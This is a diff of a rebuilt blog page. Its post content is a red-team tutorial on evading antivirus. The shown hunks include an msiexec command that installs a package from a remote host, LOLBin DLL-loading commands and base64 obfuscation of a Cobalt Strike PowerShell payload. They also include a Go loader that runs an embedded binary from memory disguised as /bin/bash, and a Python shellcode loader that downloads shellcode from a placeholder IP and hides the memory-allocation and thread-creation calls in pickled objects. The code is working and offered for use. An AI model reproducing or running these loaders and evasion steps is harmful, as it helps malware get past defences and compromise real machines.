@@ -34,8 +34,8 @@
     
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -65,7 +65,7 @@
 <header class="header-wrapper">
 
     <div class="border-box header-content">
-        <div class="left border-box">
+        <div class="left flex-start border-box">
             
                 <a class="logo-image border-box" href="/">
                     <img src="/images/logo.svg">
@@ -77,67 +77,67 @@
         </div>
 
         <div class="right border-box">
-            <div class="pc">
-                <ul class="menu-list">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
                                 
                                 HOME
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
                                 
                                 ARCHIVES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
                                 
                                 TAGS
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
                                 
                                 CATEGORIES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
                                 
                                 ABOUT
+                                
                             </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas search fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -149,41 +149,66 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/"
-                    >HOME</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives"
-                    >ARCHIVES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags"
-                    >TAGS</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories"
-                    >CATEGORIES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about"
-                    >ABOUT</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            ABOUT
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -241,10 +266,12 @@
                 <span class="datetime">2021-08-02 22:20:10</span>
             </span>
 
-            <span class="meta-info-item post-update-date">
-                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Wed Apr 12 2023 20:13:36 GMT+0800">2023-04-12 20:13:36</span>
-            </span>
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Wed Apr 12 2023 20:13:36 GMT+0800">2023-04-12 20:13:36</span>
+                </span>
+            
         
 
         
@@ -297,10 +324,11 @@
                     </div>
                 
 
-                <div class="post-content keep-markdown-body">
+                <div class="post-content keep-markdown-body ">
                     
 
-                    <p>Techniques of bypassing antivirus are developing rapidly, and this article shows some practical tools&#x2F;tips.</p>
+                    
+                         <p>Techniques of bypassing antivirus are developing rapidly, and this article shows some practical tools&#x2F;tips.</p>
 <h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><p>Actually years age just modifying some special strings or add rubbish paddings at the end makes antivirus confused about the sample, but for now only encryption and obfuscation works, sometimes we even need to explore more native APIs to bypass and this can be still temporary.</p>
 <p>What I want to show here is not about detailed information, but some easy-to-use tools which help red teaming. For some hardcore learners, check <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/tree/master/ShellCode" >this<i class="fas fa-external-link-alt"></i></a> out.</p>
 <h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a class="link"   target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework" >Metasploit<i class="fas fa-external-link-alt"></i></a></h3><p>In <a href="/2020/03/17/2020-03-17-MSF-Pentest-Route/">MSF Pentest Route</a> I introduced pretty much about metasploit framework penetration testing, only to forget the <code>Evasion</code> module which updated in Metasploit 5.0.</p>
@@ -364,9 +392,9 @@
 <p>X64</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\regasm.exe /U AllTheThings.dll</span><br></pre></td></tr></table></figure>
 <h3 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h3><p>X86</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s /u AllTheThings.dll --&gt; Calls DllUnregisterServer</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s /u AllTheThings.dll <span class="literal">--</span>&gt; Calls DllUnregisterServer</span><br></pre></td></tr></table></figure>
 <p>X64</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s AllTheThings.dll --&gt; Calls DllRegisterServer</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; regsvr32 /s AllTheThings.dll <span class="literal">--</span>&gt; Calls DllRegisterServer</span><br></pre></td></tr></table></figure>
 <h3 id="Rundll32-exe"><a href="#Rundll32-exe" class="headerlink" title="Rundll32.exe"></a>Rundll32.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; rundll32 AllTheThings.dll,EntryPoint</span><br></pre></td></tr></table></figure>
 <h3 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\System32\msiexec.exe /q /i http://ip:port/beta.txt</span><br></pre></td></tr></table></figure>
 
@@ -416,7 +444,7 @@
 </ul>
 <p>When we run <code>Powershell -ExecutionPolicy Bypass -File ./payload.sp1</code> to execute payload that <code>Cobalt Strike</code> generated, it will be detected by AV.</p>
 <p>We can try <code>base64</code> encoding to encode the whole string that this original payload loads to run, and load it by decoding first in new payload. Replace it as:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64</span><span class="literal">-decoded</span><span class="literal">-var</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64</span><span class="literal">-encoded</span><span class="literal">-string</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64</span><span class="literal">-decoded-var</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$base64</span><span class="literal">-encoded-string</span>))</span><br></pre></td></tr></table></figure>
 <p>And dont forget to change related variable names. Then run <code>Powershell -ExecutionPolicy Bypass -File .\payload.sp1</code> to get it online and bypassing AV.</p>
 <ul>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation" >Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></li>
@@ -486,7 +514,7 @@
 <p>And we get result:<br><img   src="/imghost/bav/1.png"  alt="linux-before"><br>As this is <code>Linux</code> platform and has been encoded, so we get this number. Anyway we use <code>golang</code> to pack:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/kevinburke/go-bindata</span><br><span class="line">$ ./go-bindata ./test</span><br></pre></td></tr></table></figure>
 <p>Here we’ll get a <code>bindata.go</code> in which stores data of <code>./test</code>, and now we should write a <code>main()</code> to load <code>test</code> data into memory and execute:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">const</span></span> (</span><br><span class="line">    mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// only kernel newer than 3.17 supports</span></span><br><span class="line">    memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    data, err := <span class="built_in">Asset</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="comment">// Asset was not found.</span></span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;read test file content error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    filename := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    fd, _, _ := syscall.<span class="built_in">Syscall</span>(memfdCreate, <span class="built_in">uintptr</span>(unsafe.<span class="built_in">Pointer</span>(&amp;filename)), <span class="built_in">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    _, _ = syscall.<span class="built_in">Write</span>(<span class="built_in"><span class="keyword">int</span></span>(fd), data)</span><br><span class="line">    displayName := <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">    fdPath := fmt.<span class="built_in">Sprintf</span>(<span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd)</span><br><span class="line">    _ = syscall.<span class="built_in">Exec</span>(fdPath, []string&#123;displayName&#125;, nil)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">const</span> (</span><br><span class="line">    mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// only kernel newer than 3.17 supports</span></span><br><span class="line">    memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    data, err := <span class="built_in">Asset</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="comment">// Asset was not found.</span></span><br><span class="line">        fmt.<span class="built_in">Println</span>(<span class="string">&quot;read test file content error!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    filename := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    fd, _, _ := syscall.<span class="built_in">Syscall</span>(memfdCreate, <span class="built_in">uintptr</span>(unsafe.<span class="built_in">Pointer</span>(&amp;filename)), <span class="built_in">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    _, _ = syscall.<span class="built_in">Write</span>(<span class="built_in">int</span>(fd), data)</span><br><span class="line">    displayName := <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">    fdPath := fmt.<span class="built_in">Sprintf</span>(<span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd)</span><br><span class="line">    _ = syscall.<span class="built_in">Exec</span>(fdPath, []string&#123;displayName&#125;, nil)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The result:<br><img   src="/imghost/bav/2.png"  alt="linux-after"><br>And the Windows platform, before:<br><img   src="/imghost/bav/3.png"  alt="win-before"><br>After:<br><img   src="/imghost/bav/4.png"  alt="win-after"><br>This testing project is on <a class="link"   target="_blank" rel="noopener" href="https://github.com/wonderkun/go-packer" >github<i class="fas fa-external-link-alt"></i></a></p>
 <h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>Like <code>Golang</code> part, converting a <code>PHP</code> reverse shell to a <code>exe</code> can also lower detection rate.</p>
 <p>The <a class="link"   target="_blank" rel="noopener" href="https://sourceforge.net/projects/bamcompile/files/latest/download" >Bambalam PHP EXE Compiler<i class="fas fa-external-link-alt"></i></a> is like <code>pyinstaller</code>, packing <code>PHP</code> script to <code>exe</code>.</p>
@@ -498,10 +526,10 @@
 <h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p><code>Python</code> is also used as a loader, always utilize <code>ctypes</code> to call <code>C</code> functions and <code>base64</code> to do obfuscation.</p>
 <p>In <code>Python</code> some functions like <code>exec()</code>, <code>eval()</code>, <code>os.system()</code> and <code>subprocess.Popen()</code> are noticed always with a glance, to hind the execution we choose deserialization.</p>
 <p>Example of <code>Python</code> deserialization:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gugu</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;calc.exe&#x27;</span>,),))</span><br><span class="line"></span><br><span class="line">ret = cPickle.dumps(gugu())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(ret)</span><br><span class="line">cPickle.loads(ret)</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">gugu</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.Popen, ((<span class="string">&#x27;calc.exe&#x27;</span>,),))</span><br><span class="line"></span><br><span class="line">ret = cPickle.dumps(gugu())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(ret)</span><br><span class="line">cPickle.loads(ret)</span><br></pre></td></tr></table></figure>
 <p>Magic method <code>__reduce__</code> is called when an object is <code>Pickled</code>, and what it returns will be executed.<br><code>os.system()</code>, <code>subprocess.Popen()</code> and <code>eval()</code> can be choosed but, only the last <code>eval()</code>  gets rid of popping black window. However <code>eval()</code> can just run single lines.</p>
 <p>Anyway here is how to generate a <code>Python</code> shellcode loader (<code>Python2</code> version):</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,cPickle,base64,urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;urllib2.urlopen(&#x27;http://x.x.x.x/xxx&#x27;).read().decode(&#x27;hex&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, shellcode</span>):</span></span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode),0x1000,0x40)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage, shellcode</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">            self.shellcode = shellcode</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.RtlMoveMemory(rwxpage,ctypes.create_string_buffer(shellcode),len(shellcode))&quot;</span>,))</span><br><span class="line">       </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test4</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, rwxpage</span>):</span></span><br><span class="line">            self.rwxpage = rwxpage</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.CreateThread(0,0,rwxpage,0,0,0)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test5</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, handle</span>):</span></span><br><span class="line">            self.handle = handle</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="built_in">eval</span>,(<span class="string">&quot;ctypes.windll.kernel32.WaitForSingleObject(handle,-1)&quot;</span>,))</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    raw_shellcode = test1()</span><br><span class="line">    ser_shellcode = cPickle.dumps(raw_shellcode)</span><br><span class="line">    enb32_shellcode = base64.b32encode(ser_shellcode)</span><br><span class="line">    shellcode = cPickle.loads(base64.b32decode(enb32_shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_vir = test2(shellcode)</span><br><span class="line">    ser_vir = cPickle.dumps(raw_vir)</span><br><span class="line">    enb32_vir = base64.b32encode(ser_vir)</span><br><span class="line">    rwxpage = cPickle.loads(base64.b32decode(enb32_vir))</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    raw_rtl = test3(rwxpage, shellcode)</span><br><span class="line">    ser_rtl = cPickle.dumps(raw_rtl)</span><br><span class="line">    enb32_rtl = base64.b32encode(ser_rtl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_handle=test4(rwxpage)</span><br><span class="line">    ser_handle = cPickle.dumps(raw_handle)</span><br><span class="line">    enb32_handle = base64.b32encode(ser_handle)</span><br><span class="line">    handle = cPickle.loads(base64.b32decode(enb32_handle))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    raw_run = test5(handle)</span><br><span class="line">    ser_run = cPickle.dumps(raw_run)</span><br><span class="line">    enb32_run = base64.b32encode(ser_run)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    output = <span class="string">&#x27;&#x27;&#x27;import ctypes,cPickle,base64,urllib2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_shellcode = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">shellcode = cPickle.loads(base64.b32decode(e_shellcode))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_rwxpage=&quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">rwxpage = cPickle.loads(base64.b32decode(e_rwxpage))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e_code = &quot;&#123;&#125;&quot;</span></span><br><span class="line"><span class="string">cPickle.loads(base64.b32decode(e_code))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 